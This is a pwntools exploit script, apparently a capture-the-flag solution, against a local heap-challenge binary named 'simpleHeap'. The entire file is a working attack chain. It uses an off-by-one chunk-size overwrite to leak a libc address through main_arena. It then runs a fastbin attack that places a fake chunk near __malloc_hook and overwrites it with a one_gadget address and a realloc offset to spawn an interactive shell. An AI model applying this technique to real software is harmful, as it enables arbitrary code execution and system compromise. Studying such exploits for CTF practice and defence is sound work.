#!/usr/bin/env python
#coding:utf-8
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

binary='./simpleHeap'
elf=ELF(binary)
libc=elf.libc

io=process(binary)

def add(size,content):
    io.sendlineafter("choice: ",'1')
    io.recvuntil("size?")
    io.sendline(str(size))
    io.recvuntil("content:")
    io.sendline(str(content))

def edit(idx,content):
    io.sendlineafter("choice: ",'2')
    io.recvuntil("idx?")
    io.sendline(str(idx))
    io.recvuntil("content:")
    io.sendline(str(content))

def show(idx):
    io.sendlineafter("choice: ",'3')
    io.recvuntil("idx?")
    io.sendline(str(idx))

def dele(idx):
    io.sendlineafter("choice: ",'4')
    io.recvuntil("idx?")
    io.sendline(str(idx))

###leak libc###
add(0x18, 'AAAA' )#0
gdb.attach(io)
pause()
add(0x60, 'BBBB')#1
add(0x60, 'CCCC' )#2
add(0x10, 'DDDD' )#3
payload = 'A' * 0x18 + '\xe1'
edit(0, payload)
dele(1)
add(0x60, 'BBBB ')#1
show(2)
main_arena = u64(io.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-88
libc_base = main_arena - 0x3c4b20
success("libc_base:"+hex(libc_base))
###fastbin attack##
realloc = libc_base + libc.symbols['__libc_realloc']
malloc_hook = libc_base + libc .symbols['__malloc_hook']
fake_chunk = malloc_hook-0x23
libc_one_gadget = [0x45216 , 0x4526a, 0xf02a4,0xf1147]
one_gadget = libc_base + libc_one_gadget[1]
add(0x60, 'clean bin')#4 and 2
dele(4)
payload = p64(fake_chunk)
edit(2, payload )
add(0x60, 'AAAA' )#4
payload = 'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc+13)
add(0x60 , payload)
###get shell###
io.sendlineafter("choice: ", '1')
io.sendlineafter("size?", '10')
io.interactive()